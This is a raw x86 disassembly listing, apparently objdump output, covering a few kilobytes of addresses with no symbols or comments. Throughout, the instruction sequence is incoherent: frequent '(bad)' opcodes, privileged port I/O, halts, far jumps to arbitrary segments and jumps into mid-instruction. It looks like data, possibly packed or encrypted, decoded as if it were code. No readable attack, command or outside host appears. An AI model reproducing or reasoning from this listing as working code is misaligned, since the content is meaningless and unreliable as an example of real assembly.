  41b9fc:	addr16 sbb al,0xa0
  41b9ff:	pop    ds
  41ba00:	xor    BYTE PTR [ebx+eiz*2-0x657eadfc],0x97
  41ba08:	inc    ebp
  41ba09:	outs   dx,DWORD PTR ds:[esi]
  41ba0a:	in     al,dx
  41ba0b:	mov    al,ds:0x7be8fe0d
  41ba10:	aad    0xc5
  41ba12:	or     dh,BYTE PTR [edx]
  41ba14:	pushf  
  41ba15:	adc    eax,0x813c9f78
  41ba1a:	fs xor al,0xd5
  41ba1d:	stos   DWORD PTR es:[edi],eax
  41ba1e:	xchg   esi,eax
  41ba1f:	push   ecx
  41ba20:	sbb    DWORD PTR [edx*4+0x640c3040],0x3e264d97
  41ba2b:	loopne 0x41ba9a
  41ba2d:	inc    ebx
  41ba2e:	(bad)  
  41ba2f:	retf   0x339c
  41ba32:	inc    ecx
  41ba33:	scas   eax,DWORD PTR es:[edi]
  41ba34:	outs   dx,BYTE PTR ds:[esi]
  41ba35:	pop    ds
  41ba36:	lods   eax,DWORD PTR ds:[esi]
  41ba37:	dec    edi
  41ba38:	sahf   
  41ba39:	inc    esi
  41ba3a:	or     dl,ah
  41ba3c:	xor    eax,0xb392ab1b
  41ba41:	xchg   ecx,eax
  41ba42:	ins    DWORD PTR es:[edi],dx
  41ba43:	or     BYTE PTR [edx+eax*4],bl
  41ba46:	sahf   
  41ba47:	(bad)  
  41ba48:	out    0x76,al
  41ba4a:	dec    esp
  41ba4b:	js     0x41ba3b
  41ba4d:	mov    cl,0xd7
  41ba4f:	loop   0x41ba10
  41ba51:	cmp    BYTE PTR [ebx],bl
  41ba53:	lock nop
  41ba55:	xor    DWORD PTR [ebx-0x2faee31f],esp
  41ba5b:	retf   0xd44e
  41ba5e:	aaa    
  41ba5f:	sbb    BYTE PTR [ecx+0x392dcb7c],dl
  41ba65:	out    0x4d,al
  41ba67:	aad    0x5c
  41ba69:	xor    BYTE PTR [eax],0x4
  41ba6c:	fld    TBYTE PTR [ecx+0x2bd2d93]
  41ba72:	adc    DWORD PTR [ebx+0x541206a4],0x9e85ca76
  41ba7c:	adc    eax,0x10b1a885
  41ba81:	jno    0x41ba93
  41ba83:	cmp    dl,BYTE PTR [eax+0x7e45f41d]
  41ba89:	fstp   DWORD PTR [edx]
  41ba8b:	in     eax,dx
  41ba8c:	pop    esp
  41ba8d:	scas   eax,DWORD PTR es:[edi]
  41ba8e:	ds sti 
  41ba90:	mov    eax,DWORD PTR [edx+0x385aa9d]
  41ba96:	lea    esp,[edi+0x26f20531]
  41ba9c:	pop    edx
  41ba9d:	pop    esp
  41ba9e:	jns    0x41bb09
  41baa0:	push   edi
  41baa1:	or     dh,BYTE PTR [ecx-0x3848205d]
  41baa7:	(bad)  
  41baa8:	out    0xd8,eax
  41baaa:	mov    ch,BYTE PTR [edx+eiz*8]
  41baad:	retf   
  41baae:	loop   0x41ba6f
  41bab0:	mov    dl,0x29
  41bab2:	inc    ebp
  41bab3:	lods   eax,DWORD PTR ds:[esi]
  41bab4:	cmc    
  41bab5:	sti    
  41bab6:	out    dx,al
  41bab7:	sbb    ecx,edi
  41bab9:	outs   dx,BYTE PTR ds:[esi]
  41baba:	(bad)  
  41babb:	in     al,dx
  41babc:	loopne 0x41baeb
  41babe:	je     0x41bb2c
  41bac0:	lock cdq 
  41bac2:	xor    eax,0x3f458940
  41bac7:	adc    DWORD PTR [ebp+0x7a11cf67],eax
  41bacd:	sub    DWORD PTR cs:[bx+si-0x40],edx
  41bad2:	test   DWORD PTR [edi+0x7ccbdde8],0xd263a312
  41badc:	xchg   ebx,eax
  41badd:	jmp    0x41bb3e
  41badf:	sbb    al,0x7c
  41bae1:	adc    al,0xeb
  41bae3:	cld    
  41bae4:	or     eax,DWORD PTR [eax+0x27fdba50]
  41baea:	adc    dl,BYTE PTR [ecx+edx*8+0x71]
  41baee:	or     DWORD PTR [ecx+0x8c7407f],edx
  41baf4:	inc    BYTE PTR [ebp-0x4]
  41baf7:	stos   DWORD PTR es:[edi],eax
  41baf8:	sbb    DWORD PTR [edx],eax
  41bafa:	or     BYTE PTR [edi-0x73],bh
  41bafd:	stc    
  41bafe:	or     al,0x5a
  41bb00:	lds    ecx,FWORD PTR [edi-0x26e94bed]
  41bb06:	inc    ecx
  41bb07:	sbb    DWORD PTR [esi-0x39],ecx
  41bb0a:	or     eax,0x9ef2175b
  41bb0f:	mov    eax,ds:0x757adeb2
  41bb14:	push   0xfb4b505f
  41bb19:	pop    edx
  41bb1a:	sbb    ah,dl
  41bb1c:	cdq    
  41bb1d:	cld    
  41bb1e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bb1f:	icebp  
  41bb20:	add    eax,0x40b9b52f
  41bb25:	int3   
  41bb26:	jmp    esp
  41bb28:	push   0xffffffde
  41bb2a:	lea    ebp,ss:[ecx+eiz*1-0x7a797118]
  41bb32:	cdq    
  41bb33:	mov    edi,0x1e60fc50
  41bb38:	xlat   BYTE PTR ds:[ebx]
  41bb39:	dec    esp
  41bb3a:	aam    0x13
  41bb3c:	push   es
  41bb3d:	ret    0x9550
  41bb40:	jns    0x41bbc1
  41bb42:	mov    edx,esp
  41bb44:	fs mov ch,0x5c
  41bb47:	fistp  DWORD PTR [edi-0x25]
  41bb4a:	ss pop edi
  41bb4c:	xchg   edi,eax
  41bb4d:	repnz push esp
  41bb4f:	xor    al,0x5c
  41bb51:	call   0x2a8eac1
  41bb56:	jecxz  0x41bb40
  41bb58:	sbb    al,0xa2
  41bb5a:	pop    ss
  41bb5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bb5c:	lods   eax,DWORD PTR ds:[esi]
  41bb5d:	stos   BYTE PTR es:[edi],al
  41bb5e:	add    ebp,DWORD PTR [ecx-0x6c]
  41bb61:	adc    cl,BYTE PTR [eax+0x3f711d10]
  41bb67:	mov    ?,WORD PTR [ebx]
  41bb69:	repz mov ch,BYTE PTR [ecx]
  41bb6c:	add    al,0x14
  41bb6e:	out    dx,al
  41bb6f:	jl     0x41bb66
  41bb71:	push   edi
  41bb72:	arpl   WORD PTR [esi-0x45be1b86],ax
  41bb78:	pop    ecx
  41bb79:	xlat   BYTE PTR ds:[ebx]
  41bb7a:	stc    
  41bb7b:	xor    ebp,DWORD PTR [eax+ebx*1+0x6c]
  41bb7f:	pop    edi
  41bb80:	push   0xc4c1fb67
  41bb85:	cmp    dh,BYTE PTR [esi]
  41bb87:	loope  0x41bb4d
  41bb89:	div    ch
  41bb8b:	inc    DWORD PTR [edi+0x74]
  41bb8e:	aad    0x9
  41bb90:	xor    DWORD PTR [eax],eax
  41bb92:	push   eax
  41bb93:	out    0xf4,al
  41bb95:	shr    BYTE PTR [edi-0x5f],cl
  41bb98:	and    bl,BYTE PTR [eax*1-0x6755c48e]
  41bb9f:	push   edx
  41bba0:	das    
  41bba1:	ds xchg esi,eax
  41bba3:	jae    0x41bbaf
  41bba5:	aas    
  41bba6:	mov    fs,WORD PTR [esi-0x2]
  41bba9:	mov    ecx,0x20eba04f
  41bbae:	xor    al,0xe
  41bbb0:	sub    eax,0x1f362d7f
  41bbb5:	les    ebx,FWORD PTR [ebx-0x882583a]
  41bbbb:	add    ah,ch
  41bbbd:	(bad)  
  41bbbe:	dec    esp
  41bbbf:	adc    BYTE PTR [esi-0x1e],bh
  41bbc2:	fldenv [edx-0x21]
  41bbc5:	out    0xc,eax
  41bbc7:	xlat   BYTE PTR ds:[ebx]
  41bbc8:	adc    al,0xc2
  41bbca:	sbb    eax,0xfd267588
  41bbcf:	and    BYTE PTR ds:0x27ebf247,dh
  41bbd5:	xchg   edi,eax
  41bbd6:	cdq    
  41bbd7:	mov    ebx,0x80d52ac6
  41bbdc:	fidiv  DWORD PTR ds:[ecx+0x6ab17733]
  41bbe3:	or     al,bh
  41bbe5:	cli    
  41bbe6:	xor    bl,BYTE PTR [eax+ebx*8-0x34]
  41bbea:	sahf   
  41bbeb:	leave  
  41bbec:	repz leave 
  41bbee:	and    cl,bh
  41bbf0:	cmp    BYTE PTR [esi],bh
  41bbf2:	inc    esp
  41bbf3:	jge    0x41bc6e
  41bbf5:	sub    al,BYTE PTR [ecx-0x141f966]
  41bbfb:	inc    esi
  41bbfc:	mov    ah,0xa6
  41bbfe:	mov    esi,DWORD PTR [edi+0xca71ca0]
  41bc04:	stc    
  41bc05:	sub    DWORD PTR [esi-0x19],edx
  41bc08:	sbb    al,dl
  41bc0a:	lock push edx
  41bc0c:	stos   DWORD PTR es:[edi],eax
  41bc0d:	out    0x28,al
  41bc0f:	and    esi,DWORD PTR [edx]
  41bc11:	rol    esp,1
  41bc13:	dec    esp
  41bc14:	xor    dl,0x5c
  41bc17:	cmp    al,0xdb
  41bc19:	imul   DWORD PTR [edx-0x38897440]
  41bc1f:	ds in  eax,0xf9
  41bc22:	push   esi
  41bc23:	dec    ebp
  41bc24:	pop    ecx
  41bc25:	repz mov ds:0xf4d5ea24,al
  41bc2b:	adc    esp,DWORD PTR [esp+eiz*4]
  41bc2e:	outs   dx,DWORD PTR ds:[esi]
  41bc2f:	jp     0x41bbd4
  41bc31:	lock fist DWORD PTR [ecx+eiz*2+0x2f9178f8]
  41bc39:	push   es
  41bc3a:	imul   esp,DWORD PTR [ebx],0xffffffa4
  41bc3d:	bnd ret 0x3150
  41bc41:	pop    esi
  41bc42:	pop    ss
  41bc43:	rol    BYTE PTR [ecx],cl
  41bc45:	adc    ecx,edx
  41bc47:	addr16 sbb ch,bl
  41bc4a:	std    
  41bc4b:	pop    ss
  41bc4c:	xchg   esi,eax
  41bc4d:	mov    ah,0x54
  41bc4f:	jge    0x41bcb1
  41bc51:	xlat   BYTE PTR ds:[ebx]
  41bc52:	xchg   esi,eax
  41bc53:	lds    ebp,FWORD PTR [edi+0xb]
  41bc56:	mov    WORD PTR [ebx-0x3509de4a],ss
  41bc5c:	ins    BYTE PTR es:[edi],dx
  41bc5d:	inc    edx
  41bc5e:	inc    esi
  41bc5f:	and    eax,0x95a3990d
  41bc64:	out    0x5e,eax
  41bc66:	call   0xf450cf3e
  41bc6b:	pop    ecx
  41bc6c:	add    DWORD PTR [ebp+0x1b],esi
  41bc6f:	push   esi
  41bc70:	push   0x6a
  41bc72:	mov    ebp,0xfd81cdb0
  41bc77:	jns    0x41bc6c
  41bc79:	push   es
  41bc7a:	push   edi
  41bc7b:	stc    
  41bc7c:	fild   QWORD PTR [ebx-0xc657442]
  41bc82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bc83:	gs pusha 
  41bc85:	adc    bh,al
  41bc87:	xchg   DWORD PTR [edx],ebp
  41bc89:	dec    esp
  41bc8a:	call   0x94849695
  41bc8f:	xchg   ecx,eax
  41bc90:	pushf  
  41bc91:	mov    eax,ds:0xcc649093
  41bc96:	pop    ecx
  41bc97:	pop    ebp
  41bc98:	and    eax,0xcf82800b
  41bc9d:	push   ecx
  41bc9e:	sub    eax,esi
  41bca0:	pop    eax
  41bca1:	mov    BYTE PTR [ebx+eiz*8+0x8e48bf5],bh
  41bca8:	mov    ebx,0x19458250
  41bcad:	mov    BYTE PTR [edx+0x16],bl
  41bcb0:	popf   
  41bcb1:	pop    esi
  41bcb2:	imul   eax,DWORD PTR [esi+eax*2+0xc],0xbe8ecc55
  41bcba:	xchg   ebx,eax
  41bcbb:	jo     0x41bcb9
  41bcbd:	retf   
  41bcbe:	xchg   ecx,eax
  41bcbf:	mov    ebp,0x7a2ad43c
  41bcc4:	and    ebx,ecx
  41bcc6:	out    0x93,al
  41bcc8:	push   ecx
  41bcc9:	dec    ecx
  41bcca:	jne    0x41bce2
  41bccc:	xchg   BYTE PTR [eax+eax*1],dh
  41bccf:	add    al,0xf1
  41bcd1:	mov    esp,0x36bb36a8
  41bcd6:	mov    bh,BYTE PTR [eax+ecx*2]
  41bcd9:	js     0x41bc92
  41bcdb:	inc    ebp
  41bcdc:	ss ds jmp 0xada3:0x4ac875e2
  41bce5:	sti    
  41bce6:	jbe    0x41bc72
  41bce8:	mov    cx,0xfe7a
  41bcec:	sub    al,ch
  41bcee:	retf   
  41bcef:	mov    ecx,0xe0b097b0
  41bcf4:	sub    esp,ecx
  41bcf6:	push   ds
  41bcf7:	add    al,0x53
  41bcf9:	inc    ecx
  41bcfa:	pop    es
  41bcfb:	sbb    esi,edx
  41bcfd:	and    bh,bh
  41bcff:	jmp    DWORD PTR [esi-0x2701c76e]
  41bd05:	popa   
  41bd06:	nop
  41bd07:	push   eax
  41bd08:	sbb    eax,0xa478cc64
  41bd0d:	(bad)
  41bd11:	jle    0x41bd09
  41bd13:	ds es mov esi,0xbb9574e8
  41bd1a:	jne    0x41bd51
  41bd1c:	mov    esp,DWORD PTR [ebx]
  41bd1e:	cdq    
  41bd1f:	sbb    BYTE PTR [esi+0x6a906dc9],bl
  41bd25:	fwait
  41bd26:	mov    ds:0xe07d21f,al
  41bd2b:	push   esi
  41bd2c:	add    edi,DWORD PTR [edx+0x2f]
  41bd2f:	inc    edx
  41bd30:	cmp    esi,DWORD PTR [eax+0x18]
  41bd33:	jbe    0x41bd1a
  41bd35:	jns    0x41bd6b
  41bd37:	sbb    al,0xf2
  41bd39:	mov    ebp,0xc2d21283
  41bd3e:	pushf  
  41bd3f:	or     edi,DWORD PTR [esi-0x4aa85d01]
  41bd45:	xchg   esi,eax
  41bd46:	mov    bl,0xce
  41bd48:	or     edi,esp
  41bd4a:	nop
  41bd4b:	ret    
  41bd4c:	lds    eax,FWORD PTR [edx-0x22b17a6e]
  41bd52:	sub    DWORD PTR [ecx+0x45e589a4],0xfffffff3
  41bd59:	call   DWORD PTR [edi]
  41bd5b:	sar    ch,0x16
  41bd5e:	push   eax
  41bd5f:	fcomp  DWORD PTR [edx]
  41bd61:	mov    ebp,0xe8df53dd
  41bd66:	push   esi
  41bd67:	pop    edx
  41bd68:	pop    esi
  41bd69:	and    ebx,DWORD PTR [ebx]
  41bd6b:	mul    BYTE PTR [ecx+0x6e]
  41bd6e:	mov    bl,0xce
  41bd70:	(bad)  
  41bd71:	in     al,dx
  41bd72:	push   es
  41bd73:	stos   BYTE PTR es:[edi],al
  41bd74:	xor    ebx,esi
  41bd76:	jp     0x41bdc2
  41bd78:	repz js 0x41bd15
  41bd7b:	or     al,0x7d
  41bd7d:	dec    ebp
  41bd7e:	pop    ecx
	...
  41bf5b:	push   edi
  41bf5c:	lea    esp,[ecx+0x7e]
  41bf5f:	sti    
  41bf60:	(bad)  
  41bf61:	pop    edi
  41bf62:	lods   eax,DWORD PTR ds:[esi]
  41bf63:	into   
  41bf64:	fisttp DWORD PTR [edx+0x58]
  41bf67:	sub    dh,BYTE PTR [esi]
  41bf69:	adc    BYTE PTR [edi+0x13051],dl
  41bf6f:	and    eax,0x55000007
  41bf74:	jne    0x41bf52
  41bf76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bf77:	pusha  
  41bf78:	outs   dx,DWORD PTR ds:[esi]
  41bf79:	mov    eax,0xf484107a
  41bf7e:	pop    ebx
  41bf7f:	mov    ss,WORD PTR [esp+ebp*1+0x16fdd12]
  41bf86:	push   es
  41bf87:	and    al,0x85
  41bf89:	rol    BYTE PTR [esi+eax*1],cl
  41bf8c:	idiv   BYTE PTR [edx-0x57]
  41bf8f:	mov    esp,0xf9c4d2f5
  41bf94:	adc    BYTE PTR [ebx],dh
  41bf96:	mov    esi,0xa5a1ff4
  41bf9b:	push   0xffffffc9
  41bf9d:	imul   ebx,DWORD PTR [eax+0x4b],0xffffffaa
  41bfa1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bfa2:	sub    dl,BYTE PTR [ecx+edx*4]
  41bfa5:	sub    al,BYTE PTR [ebx-0x46]
  41bfa8:	dec    eax
  41bfa9:	cmp    ecx,DWORD PTR [ecx+0x4719f0e]
  41bfaf:	push   0xffffffd9
  41bfb1:	xchg   edi,eax
  41bfb2:	add    BYTE PTR [edi],cl
  41bfb4:	outs   dx,DWORD PTR ds:[esi]
  41bfb5:	bound  eax,QWORD PTR [ecx-0x13027398]
  41bfbb:	sbb    eax,0x6e33c009
  41bfc0:	(bad)  
  41bfc1:	mov    WORD PTR [ebx+0x7355f68c],fs
  41bfc7:	push   ss
  41bfc8:	(bad)  
  41bfc9:	adc    edi,DWORD PTR [edi]
  41bfcb:	shl    DWORD PTR [ebx+ecx*2],1
  41bfce:	lahf   
  41bfcf:	jg     0x41bfa2
  41bfd1:	cdq    
  41bfd2:	cmp    ah,BYTE PTR [ebp-0xc]
  41bfd5:	(bad)  
  41bfd6:	(bad)  
  41bfd7:	or     BYTE PTR [esi+0x1a],ch
  41bfda:	les    edi,FWORD PTR [edi+0x23]
  41bfdd:	or     eax,0x2251ca3c
  41bfe2:	in     al,dx
  41bfe3:	cmp    bl,ah
  41bfe5:	pop    edi
  41bfe6:	std    
  41bfe7:	fimul  DWORD PTR [ecx-0x24]
  41bfea:	push   ss
  41bfeb:	mov    bl,0xd
  41bfed:	pop    ecx
  41bfee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bfef:	daa    
  41bff0:	mov    esi,0x33b5e2c5
  41bff5:	inc    edi
  41bff6:	push   cs
  41bff7:	mov    eax,ds:0x9b6ddecf
  41bffc:	sbb    BYTE PTR [edx],0x63
  41bfff:	data16 and al,0xd
  41c002:	test   BYTE PTR [esi+0x60],ah
  41c005:	rol    BYTE PTR [ebx+edi*8+0x10dec00],1
  41c00c:	lods   eax,DWORD PTR ds:[esi]
  41c00d:	sbb    edi,DWORD PTR [eax]
  41c00f:	jp     0x41bfc3
  41c011:	dec    edi
  41c012:	mov    esp,0x1f22e8ec
  41c017:	cld    
  41c018:	(bad)  
  41c019:	dec    esi
  41c01a:	fcomp  DWORD PTR [ecx-0x15b8d1be]
  41c020:	push   edx
  41c021:	sbb    edx,DWORD PTR [edx+eax*1-0x63123be6]
  41c028:	std    
  41c029:	sbb    DWORD PTR [ecx],ecx
  41c02b:	sub    BYTE PTR [eax],ch
  41c02d:	lods   al,BYTE PTR ds:[esi]
  41c02e:	aaa    
  41c02f:	cmp    DWORD PTR [ebx-0x6b],ecx
  41c032:	sbb    cl,0xe5
  41c035:	test   al,0xc7
  41c037:	or     bh,ah
  41c039:	pop    ss
  41c03a:	ret    
  41c03b:	mov    bh,BYTE PTR [edx]
  41c03d:	jae    0x41bfd2
  41c03f:	mov    ecx,0x41f95440
  41c044:	retf   
  41c045:	cdq    
  41c046:	mov    ecx,0x6429b693
  41c04b:	xchg   ebp,edx
  41c04d:	sub    ah,BYTE PTR ds:0x19d1ed50
  41c053:	pop    ds
  41c054:	xlat   BYTE PTR ds:[ebx]
  41c055:	xchg   ebx,eax
  41c056:	(bad)  
  41c057:	std    
  41c058:	jl     0x41c084
  41c05a:	mov    eax,0x6ad788bd
  41c05f:	sbb    BYTE PTR [ebp+0x51ddd880],ch
  41c065:	fbld   TBYTE PTR [edi-0x30d2fcf2]
  41c06b:	inc    BYTE PTR [eax-0x26]
  41c06e:	scas   eax,DWORD PTR es:[edi]
  41c06f:	jl     0x41c03b
  41c071:	mov    edi,0x66ef1956
  41c076:	call   0x47e2:0xf62872b2
  41c07d:	lahf   
  41c07e:	das    
  41c07f:	xor    al,0x48
  41c081:	imul   eax,esp,0xffffffe1
  41c084:	xchg   edx,eax
  41c085:	pop    ecx
  41c086:	jno    0x41c00a
  41c088:	sub    dh,BYTE PTR [eax]
  41c08a:	push   ss
  41c08b:	adc    edx,DWORD PTR [edx+0x1144e0c9]
  41c091:	mov    bl,0xcf
  41c093:	mov    ecx,0x1b2003f0
  41c098:	dec    esi
  41c099:	call   0x590ad2b8
  41c09e:	sub    DWORD PTR [edi],ebp
  41c0a0:	xchg   ecx,eax
  41c0a1:	gs cmp al,0xfe
  41c0a4:	ror    BYTE PTR [ebp-0x4b],1
  41c0a7:	cdq    
  41c0a8:	std    
  41c0a9:	(bad)  
  41c0aa:	in     eax,0xdf
  41c0ac:	jb     0x41c0a0
  41c0ae:	xor    eax,0x78ee6816
  41c0b3:	retf   
  41c0b4:	ss pusha 
  41c0b6:	fcom   DWORD PTR [edx]
  41c0b8:	sbb    edi,DWORD PTR [ecx]
  41c0ba:	or     eax,0x608a305f
  41c0bf:	xchg   ebx,eax
  41c0c0:	or     al,0x9b
  41c0c2:	jo     0x41c071
  41c0c4:	stc    
  41c0c5:	shl    DWORD PTR [edi-0x76bd88cd],0xe3
  41c0cc:	mov    edi,DWORD PTR [ecx+eax*2-0x1e]
  41c0d0:	popf   
  41c0d1:	pop    eax
  41c0d2:	inc    edi
  41c0d3:	mov    al,0x1e
  41c0d5:	lods   eax,DWORD PTR ds:[esi]
  41c0d6:	cli    
  41c0d7:	and    DWORD PTR [edi+ebp*2+0x3b],esp
  41c0db:	sub    DWORD PTR [ebx+0x21],ebp
  41c0de:	int3   
  41c0df:	push   ss
  41c0e0:	repnz bound eax,QWORD PTR [eax]
  41c0e3:	and    eax,0x2df7f982
  41c0e8:	sbb    eax,0x499134db
  41c0ed:	in     eax,dx
  41c0ee:	mov    dl,0xb0
  41c0f0:	shl    DWORD PTR [esi+0x40c73313],cl
  41c0f6:	cmp    BYTE PTR [esi-0x51],bh
  41c0f9:	sahf   
  41c0fa:	rcl    DWORD PTR [ebx+eax*1-0x23f78371],cl
  41c101:	lds    eax,FWORD PTR [ebx]
  41c103:	repz in al,dx
  41c105:	lods   eax,DWORD PTR ds:[esi]
  41c106:	sub    BYTE PTR [esi+0x35],ch
  41c109:	stos   BYTE PTR es:[edi],al
  41c10a:	inc    ebp
  41c10b:	in     al,dx
  41c10c:	ss into 
  41c10e:	dec    ecx
  41c10f:	push   0x2d
  41c111:	pop    edx
  41c112:	cmp    al,0xbc
  41c114:	fsub   QWORD PTR [ebx-0x42]
  41c117:	sbb    al,0x51
  41c119:	(bad)  
  41c11a:	iret   
  41c11b:	inc    ecx
  41c11c:	adc    DWORD PTR [ebp+0x66],eax
  41c11f:	popa   
  41c120:	call   0xa287:0xfab50250
  41c127:	mov    edx,DWORD PTR [ecx]
  41c129:	adc    al,bl
  41c12b:	clc    
  41c12c:	jge    0x41c197
  41c12e:	gs adc eax,0x33162b0c
  41c134:	sti    
  41c135:	fist   DWORD PTR [esp+edx*8]
  41c138:	stc    
  41c139:	lock push edi
  41c13b:	mov    bh,0xae
  41c13d:	fwait
  41c13e:	(bad)  
  41c13f:	outs   dx,BYTE PTR ds:[esi]
  41c140:	call   FWORD PTR [ebx-0x421d3091]
  41c146:	pop    esp
  41c147:	mov    cl,0xe5
  41c149:	inc    ebx
  41c14a:	shl    DWORD PTR [edx+ecx*1-0x19],0x40
  41c14f:	push   ecx
  41c150:	mov    ebx,ecx
  41c152:	jl     0x41c169
  41c154:	arpl   WORD PTR [eax+0x353df09c],bp
  41c15a:	cmp    BYTE PTR [ebp-0x4e],dh
  41c15d:	or     esp,DWORD PTR [ebx]
  41c15f:	test   eax,0x6235bf21
  41c164:	xchg   ebp,eax
  41c165:	jns    0x41c0ea
  41c167:	jnp    0x41c118
  41c169:	jns    0x41c1c7
  41c16b:	xor    edi,ecx
  41c16d:	add    eax,0xbd1d71bf
  41c172:	es and al,0xe
  41c175:	sbb    al,0xd8
  41c177:	cmp    ebp,ebx
  41c179:	fcom   DWORD PTR [ebx]
  41c17b:	out    0xb5,eax
  41c17d:	mov    ecx,0xf74b06be
  41c182:	mov    bl,0xaf
  41c184:	pop    eax
  41c185:	lea    esp,[edi+eax*2-0x80]
  41c189:	jle    0x41c1c9
  41c18b:	inc    ebx
  41c18c:	cmp    bl,BYTE PTR [edi-0x2ab4dee0]
  41c192:	pop    DWORD PTR [edx]
  41c194:	or     DWORD PTR [eax-0x55f21e37],0xd9b7d9f4
  41c19e:	retf   
  41c19f:	aad    0x29
  41c1a1:	mov    bl,0x13
  41c1a3:	xchg   edi,eax
  41c1a4:	xchg   DWORD PTR [esi+0x753982d6],ebp
  41c1aa:	add    BYTE PTR [esi+0x79],0xa2
  41c1ae:	add    al,0x5a
  41c1b0:	and    dl,BYTE PTR [ebp+0xe]
  41c1b3:	loope  0x41c1b4
  41c1b5:	add    ch,BYTE PTR [edi-0x6e]
  41c1b8:	dec    eax
  41c1b9:	call   0x2479a3f2
  41c1be:	mov    WORD PTR cs:[edx-0x7ca49ae3],ds
  41c1c5:	fsubr  QWORD PTR [eax*8+0x1c2b107f]
  41c1cc:	ins    BYTE PTR es:[edi],dx
  41c1cd:	inc    edi
  41c1ce:	rcl    DWORD PTR [edx],cl
  41c1d0:	(bad)  
  41c1d1:	sbb    eax,0x573c335a
  41c1d6:	xor    DWORD PTR [ebx],eax
  41c1d8:	pop    ebx
  41c1d9:	icebp  
  41c1da:	fld    st(2)
  41c1dc:	mov    edi,0xc70d3dc3
  41c1e1:	idiv   ecx
  41c1e3:	xor    DWORD PTR [ebx+0x71],esp
  41c1e6:	out    dx,eax
  41c1e7:	jl     0x41c1c1
  41c1e9:	pop    ebp
  41c1ea:	jmp    0xf75:0x49451191
  41c1f1:	xchg   DWORD PTR [ebp+0x1f2b8dab],ecx
  41c1f7:	sub    BYTE PTR [ecx+esi*2+0x79],bl
  41c1fb:	adc    eax,0x7e90d724
  41c200:	push   ecx
  41c201:	jg     0x41c260
  41c203:	mov    ebx,0xc8143d81
  41c208:	push   0xffffffa2
  41c20a:	ss jns 0x41c20c
  41c20d:	aad    0x98
  41c20f:	jae    0x41c24c
  41c211:	bound  edi,QWORD PTR [edi+eiz*1+0x29f09b88]
  41c218:	pop    ebp
  41c219:	imul   ecx,ebx,0xffffffb2
  41c21c:	cld    
  41c21d:	or     ebp,DWORD PTR [edx]
  41c21f:	jmp    0xd239739f
  41c224:	out    dx,al
  41c225:	fldcw  WORD PTR [eax+0x70]
  41c228:	mov    eax,0xc23283d8
  41c22d:	mov    dl,0xe4
  41c22f:	call   0x48be8259
  41c234:	mov    bl,BYTE PTR [esi]
  41c236:	sub    bl,BYTE PTR [eax]
  41c238:	sbb    al,0x80
  41c23a:	cwde   
  41c23b:	inc    ebx
  41c23c:	mov    eax,cs
  41c23e:	hlt    
  41c23f:	hlt    
  41c240:	inc    ebp
  41c241:	popf   
  41c242:	rcl    bl,cl
  41c244:	rol    DWORD PTR ds:0xa69e124d,1
  41c24a:	jmp    0x6bc5556e
  41c24f:	stos   DWORD PTR es:[edi],eax
  41c250:	push   0xffffffcf
  41c252:	inc    edi
  41c253:	data16 aad 0x19
  41c256:	into   
  41c257:	jge    0x41c1f1
  41c259:	adc    dl,dl
  41c25b:	dec    ecx
  41c25c:	pusha  
  41c25d:	out    dx,eax
  41c25e:	aaa    
  41c25f:	adc    ebx,DWORD PTR [eax+eiz*8]
  41c262:	test   eax,0xf769ad34
  41c267:	inc    eax
  41c268:	xchg   esp,eax
  41c269:	pop    edx
  41c26a:	or     DWORD PTR [eax-0x68],ecx
  41c26d:	gs pop es
  41c26f:	sub    DWORD PTR [edi+0x43],0xd97a06bc
  41c276:	frstor [ecx+0x35]
  41c279:	iret   
  41c27a:	nop
  41c27b:	outs   dx,DWORD PTR ds:[esi]
  41c27c:	popa   
  41c27d:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  41c27f:	rol    cl,cl
  41c281:	leave  
  41c282:	nop
  41c283:	mov    edx,0xe332ce2d
  41c288:	dec    eax
  41c289:	jnp    0x41c23b
  41c28b:	popf   
  41c28c:	pop    ds
  41c28d:	or     eax,0x16541d41
  41c292:	sub    al,0x58
  41c294:	fbld   TBYTE PTR [edi+ecx*2-0x3fb39899]
  41c29b:	jmp    0x7ca5:0xfd6623ec
  41c2a2:	cmp    eax,0x4fef9de0
  41c2a7:	call   0xaac222ee
  41c2ac:	gs in  al,dx
  41c2ae:	push   edx
  41c2af:	push   cs
  41c2b0:	and    al,0x7e
  41c2b2:	push   es
  41c2b3:	mov    es,WORD PTR [eax-0x472f851f]
  41c2b9:	fmul   st(0),st
  41c2bb:	jmp    0x522c:0xf2a3afd3
  41c2c2:	mov    bl,0xf
  41c2c4:	cmp    al,0x1d
  41c2c6:	adc    DWORD PTR [eax-0x1bc4340b],ecx
  41c2cc:	cli    
  41c2cd:	or     al,0xd4
  41c2cf:	xchg   DWORD PTR [esi-0x43],edi
  41c2d2:	dec    ebp
  41c2d3:	inc    ebp
  41c2d4:	(bad)  
  41c2d5:	in     al,0x82
  41c2d7:	icebp  
  41c2d8:	js     0x41c33e
  41c2da:	sbb    eax,0x400f3d04
  41c2df:	arpl   sp,si
  41c2e1:	push   eax
  41c2e2:	dec    DWORD PTR [ecx-0x7a]
  41c2e5:	xchg   ebp,eax
  41c2e6:	stos   DWORD PTR es:[edi],eax
  41c2e7:	sti    
  41c2e8:	jbe    0x41c33a
  41c2ea:	lock stc 
  41c2ec:	push   ds
  41c2ed:	std    
  41c2ee:	xor    edi,ebp
  41c2f0:	in     eax,0xa4
  41c2f2:	jbe    0x41c31c
  41c2f4:	sbb    DWORD PTR [edx+0x6a],edi
  41c2f7:	out    0x14,al
  41c2f9:	and    DWORD PTR [edi-0x38056983],eax
  41c2ff:	push   es
  41c300:	je     0x41c324
  41c302:	jge    0x41c2ff
  41c304:	xchg   edx,eax
  41c305:	xchg   edx,eax
  41c306:	mov    ebx,DWORD PTR ds:0xbc7d737a
  41c30c:	mov    ecx,0xfac735b4
  41c311:	inc    BYTE PTR [edi]
  41c313:	lds    ebx,FWORD PTR [ecx+0x29]
  41c316:	lea    esp,ds:0x586293ae
  41c31c:	push   esi
  41c31d:	gs inc esi
  41c31f:	sti    
  41c320:	push   ebp
  41c321:	loopne 0x41c307
  41c323:	or     DWORD PTR ds:0x71b2dd75,edi
  41c329:	sbb    BYTE PTR [ebx-0x561ca3a8],ch
  41c32f:	mov    ecx,0x741e29ed
